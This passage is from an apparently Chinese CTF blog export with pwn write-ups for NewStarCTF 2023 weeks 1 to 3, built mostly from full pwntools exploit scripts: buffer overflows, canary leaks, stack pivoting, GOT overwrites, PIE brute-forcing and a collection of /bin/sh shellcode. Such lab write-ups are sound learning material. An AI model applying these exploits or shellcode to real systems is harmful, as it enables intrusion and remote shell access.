class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Show me your magic again\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="canary">canary</span></h2><p>一样是一道经典题型 canary，开启了 canary 和 NX，还有格式化字符串漏洞，经典思路就是通过格式字符串去泄露 canary（如果没有格式化字符串漏洞，那只能通过溢出的形式去泄露 canary），但是我们需要在 gdb 里面找到 canary 是第几个参数，运行文件就可以发现偏移是 6。</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/4.png"></p>
<p>IDA 反编译一下，你会发现有后门函数，就不需要像上一题一样要自己泄露 libc 了，同时还有格式化字符串漏洞，刚好可以帮我们打印出 canary 的值。</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/5.png"></p>
<p>把断点打在 printf，gdb 调试寻找 canary 的值，你就可以发现 canary 是第十一个参数（这个你不会看不出来吧 -_-），接下来就是套路了。</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/6.png"></p>
<p><strong>exp 如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27406</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401262</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%11$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Oh thanks,There is my gift:\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="secret-number">secret number</span></h2><p>老规矩查看一下保护机制，保护全开看着有点吓人，没事代码审计一下。</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/7.png"></p>
<p>认真代码审计，你就会发现只需要让 v5 等于 secret 就可以直接获得 flag，v5 是我们自己输入的，secret 是一个伪随机数，所以我们只需要让时间做种子，输入伪随机数即可。</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/8.png"></p>
<p><strong>exp 如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python复制编辑<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28725</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">num1 = libc.rand()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Give me some gift?(0/1)\n&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Guess the number\n&#x27;</span>, <span class="built_in">str</span>(num1))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="stack-migration">stack migration</span></h2><p>只开启了 NX，IDA 反编译，就会发现存在溢出，但是溢出的长度只有 0x10，不够构造 shellcode，所以只能通过栈迁移来解决这一问题。</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/9.png"></p>
<p>IDA 一下，代码审计一下，你会发现往 buf 里面输入数据，然后就会打印出栈地址，然后就是一个细节需要注意（红色框住的），v2 地址就是栈地址 +8（这里你要明白栈是怎么存储数据的，高地址在下，低地址在上，这就是为什么加8的原因），第二个 read 发生了栈溢出，但是溢出的长度不足以构造 rop 链，所以只能进行栈迁移（<code>leave; ret;</code>，leave 相对于是 <code>mov esp, ebp; pop ebp;</code>，ret 是 <code>pop eip;</code>）这样就简单明了了，下面就是需要注意一下接受数据（是否有空格，这里我踩坑了 -_-）。</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/10.png"></p>
<p><strong>exp 如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python复制编辑<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26912</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./111&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x401333</span></span><br><span class="line">ret_addr = <span class="number">0x4012AB</span></span><br><span class="line">main = <span class="number">0x4011FB</span></span><br><span class="line">leave = <span class="number">0x4012AA</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;I have a small gift for you: &#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>) + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;more infomation plz:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main)</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack) + p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;maybe I&#x27;ll see you soon!\n&quot;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;I have a small gift for you: &#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>) + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack) + p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="shellcode-revenge">shellcode revenge</span></h2><p>查看一下保护机制，开启 NX 和 Canary，IDA 反编译一下，代码审计看的脑壳痛。</p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/11.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/12.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK2%5DPWN/13.png"></p>
<p>把官方 wp 贴这里，后续懂了再来改。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python复制编辑<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27904</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./shellcodere&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&#x27;\x33\x42\x38&#x27;</span>  <span class="comment"># 33 42 38 xor eax, DWORD PTR [rdx+0x38]</span></span><br><span class="line">payload += <span class="string">b&#x27;\x31\x42\x30&#x27;</span>  <span class="comment"># 31 42 30 xor DWORD PTR [rdx+0x30], eax</span></span><br><span class="line">payload += <span class="string">b&#x27;\x33\x42\x37&#x27;</span>  <span class="comment"># 33 42 38 xor eax, DWORD PTR [rdx+0x38]</span></span><br><span class="line">payload += <span class="string">b&#x27;\x31\x42\x38&#x27;</span>  <span class="comment"># 31 42 38 xor DWORD PTR [rdx+0x38], eax</span></span><br><span class="line">payload += <span class="string">b&#x27;\x59&#x27;</span> * (<span class="number">0x30</span> - <span class="built_in">len</span>(payload))  <span class="comment"># 59 pop rcx</span></span><br><span class="line">payload += <span class="string">b&#x27;\x4e\x44&#x27;</span> * <span class="number">2</span>  <span class="comment"># syscall 0x4e^0x41=0xf 0x44^0x41=0x5</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span>         <span class="comment"># xor key</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;magic\n&quot;</span>, payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x50</span> + asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="总结">总结：</span></h1><p>栈迁移这块还不是很熟悉，shellcode 的相关手法还得继续学习 -_-，还得继续努力啊！！！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>NewStarCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF 2023 [WEEK 1] PWN</title>
    <url>/NewStarCTF%202023%20%5BWEEK%201%5D%20PWN/</url>
    <content><![CDATA[<p>NewStarCTF 2023 [WEEK 1] PWN</p>
<span id="more"></span>

<h1><span id="简介">简介：</span></h1><p>祝大家国庆节快乐，国庆就别再打 CTF 了，别卷了师傅们，玩玩吧！！！</p>
<p>第一周的题目相对比较容易，pwn 没有 ak 有点可惜，伪随机的部分弄得还不是很清楚，需要加把油</p>
<hr>
<h2><span id="ret2text">ret2text</span></h2><p>一看题目就知道是经典栈溢出，老规矩查看保护机制，打开了栈不可执行 NX</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/1.png"></p>
<p>IDA 查看反汇编，栈溢出很明显，并且还自带后门函数</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/2.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/3.png"></p>
<p>最后再查看一下需要溢出多少字节的垃圾数据（一般情况下需要溢出的垃圾数据可以在 IDA 里面找到），gdb 调试一下，0x80 - 0x60 &#x3D; 0x20</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/4.png"></p>
<p>直接攻击就行，exp 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26188</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">backdoor = <span class="number">0x4011FB</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(backdoor)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ezshellcode">ezshellcode</span></h2><p>也是比较经典的 shellcode，开启 NX，往栈上写 shellcode 即可（但是需要注意的点就是 shellcode 的长度，根据题目来确定）</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/5.png"></p>
<p>IDA 反汇编也比较明显，就是往 buf 里面写入 shellcode</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/6.png"></p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29928</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>相关的 shellcode 如下，可以了解下！！！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 32位 短字节shellcode --&gt; 21字节</span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"> </span><br><span class="line"># 32位 纯ascii字符shellcode</span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"> </span><br><span class="line"># 32位 scanf可读取的shellcode</span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br><span class="line"> </span><br><span class="line"># 64位 scanf可读取的shellcode 22字节</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"># 64位 较短的shellcode  23字节</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"># 64位 纯ascii字符shellcode</span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="newstar-shop">newstar shop</span></h2><p>这道题就是一道整形溢出，需要认真的代码审计，当时做的的时候有点傻逼，脑子没有转过来一直在想 dont_try 一次只能一次扣 50，这样不可能使 money 达不到负数，忘记可以买东西了我真啥</p>
<p>先看下 shop()，很明显自己的目的就是使直接赚够钱可以买到 shell，从而达到 <code>cat flag</code> 的目的</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/7.png"></p>
<p>money 属于无符号整型，这里就要想办法溢出才能有足够的钱买 shell，如果单靠自己打工赚钱的话根本不可能，题目还设置了自己一天的工作时间，所以只有自己想办法溢出才是唯一的出路</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/8.png"></p>
<p>题目还给参数设置了一些初始值，现在的任务就是使 money 变成负数就可以达到整型溢出</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/9.png"></p>
<p><strong>思路如下：</strong>
（直接 nc 连接，然后就是先买两次商品，最后 dont_try 扣一次钱，就能达到溢出的目的，再去买 shell，就可以直接拿下）</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/10.png"></p>
<hr>
<h2><span id="p1eee">p1eee</span></h2><p>查看保护机制，开启了 PIE 地址随机化，每次运行的基址都不一样，但是 PIE 不会随机化地址的低 12 位（也就是说后三位地址是固定的），所以可以采用 partial write，爆破倒数第四位，十六分之一的成功几率</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/11.png"></p>
<p>IDA 反编译，存在栈溢出，并且有后门函数（因为开启了 PIE，地址的后三位不会变 <code>26c</code>，所以只需爆破倒数第四位）。由于小端序的原因，所以就是 <code>\x6c\x11</code>，后面 <code>\x11</code> 是随机的，可以改成别的，如下都行：</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">l<span class="attr">ist</span> <span class="operator">=</span> [<span class="string">&quot;<span class="char escape_">\x</span>01&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>11&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>21&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>31&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>41&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>51&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>61&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>71&quot;</span>,</span><br><span class="line">        <span class="string">&quot;<span class="char escape_">\x</span>81&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>91&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>a1&quot;</span>, <span class="string">&quot;<span class="char escape_">\x</span>b1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>c1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>d1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>e1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>f1&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>但是需要转换（都是套路）</p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/12.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/13.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/14.png"></p>
<p>接下来就是写脚本爆破了（脚本格式通用），exp 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28968</span>)</span><br><span class="line">        elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">         </span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p16(<span class="number">0x126c</span>)</span><br><span class="line">        </span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="random">Random</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26977</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"> </span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">num1 = libc.rand()</span><br><span class="line"> </span><br><span class="line">p.sendline(<span class="built_in">str</span>(num1))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="总结">总结：</span></h1><p>伪随机部分还相对薄弱，需要加把油，绕过 PIE 掌握的差不多了，加油，奥里给！！！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>NewStarCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF 2023 [WEEK 3] PWN</title>
    <url>/NewStarCTF%202023%20%5BWEEK%203%5D%20PWN/</url>
    <content><![CDATA[<p>NewStarCTF 2023 [WEEK 3] PWN</p>
<span id="more"></span>

<h1><span id="简介">简介：</span></h1><p>这周时间不是很充裕，没有来得及做，题目真的逐渐变难，很多不是很了解的知识点逐渐暴露，这些知识点理解起来也挺难的，慢慢来，别急，加油！！！</p>
<hr>
<h2><span id="puts-or-system">puts or system?</span></h2><p>查看一下保护机制，打开了 canary 和 NX，还有一个点就是 RELRO（注意一下，因为这题需要修改 got 表），开启了部分说明 got,plt 可读可写，不懂的可以看（<a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a>）</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/1.png"></p>
<p>ida 反汇编一下，看看伪代码，发现发生了溢出和格式字符串漏洞，还有一个重要的点就是 <code>puts(&quot;/bin/sh&quot;)</code>，我们肯定得想办法变成 <code>system(&quot;/bin/sh&quot;)</code>，这样的话就可以获得 shell，所以我们就可以用到 pwntools 里面的工具 <code>fmtstr_payload</code> 来把 puts 的 got 地址修改成 system 的地址，那我们就先通过 <code>%s</code> 的方法来泄露 libc 从而来获得 system 的地址，这样就可以获得 shell 了（这种泄露 libc 的方法可以记一下）</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/2.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/3.png"></p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26095</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(0/1)\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%9$sAAAA&#x27;</span> + p64(got_addr)   <span class="comment"># 对齐</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;There is my gift:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(0/1)\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">8</span>, &#123;got_addr: sys_addr&#125;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What\&#x27;s it\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="orw-amp-rop">orw &amp; rop</span></h2><p>查看一下保护机制，跟上题一样的保护机制，根据题目就知道是开启了沙盒，不能使用 execve 调用，需要自己构造 orw 去获得 flag</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/4.png"></p>
<p>ida 一下，发现有个沙盒，并且开辟了一块可读可写的区域 <code>0x66660000</code>，还发生格式字符串漏洞和栈溢出，可通过格式字符串漏洞，把 canary 和 libc 泄露出来，然后就是套 canary 的模板（可见 <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a>）</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/5.png"></p>
<p>运行程序，发现偏移为 6，并且 canary 为第 11 个参数，可通过 puts 函数来泄露 libc，然后就是通过寄存器把参数传进去，最后就可以直接构造 orw</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/6.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/7.png"></p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python复制编辑<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ezorw&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28531</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%11$p%8$saaaaaaa&#x27;</span> + p64(got_addr)     <span class="comment"># 对齐</span></span><br><span class="line">p.sendafter(<span class="string">&quot;sandbox\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)     <span class="comment"># canary = int(p.recv()[2:18],16)</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span 